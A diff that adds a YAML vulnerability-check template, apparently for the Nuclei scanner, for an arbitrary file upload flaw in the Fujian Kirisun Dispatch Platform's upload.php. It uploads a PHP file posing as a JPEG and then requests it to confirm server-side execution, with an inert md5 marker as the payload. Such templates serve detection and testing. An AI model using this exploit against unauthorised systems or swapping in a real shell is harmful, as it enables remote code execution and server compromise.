@@ -1,0 +1,53 @@
+id: poc-yaml-kirisun-upload-anyfile-rce
+info:
+  name: Fujian Kirisun Dispatch Platform Arbitrary File Upload (upload.php)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: arbitrary-write, file-upload, rce
+  description: |
+    Vulnerability in Fujian Kirisun Dispatch Platform allows arbitrary file upload via `upload.php`. This can lead to remote code execution.
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/api/client/upload.php'
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVBf7Cs8QWsfwC82M
+    body: |
+      ------WebKitFormBoundaryVBf7Cs8QWsfwC82M
+      Content-Disposition: form-data; name="ulfile"; filename="{{filename}}.php"
+      Content-Type: image/jpeg
+
+      <?php echo md5({{t1}});?>
+      ------WebKitFormBoundaryVBf7Cs8QWsfwC82M--
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+
+  - id: confirm-upload
+    method: GET
+    path:
+      - '{{BaseURL}}/upload/{{filename}}.php'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
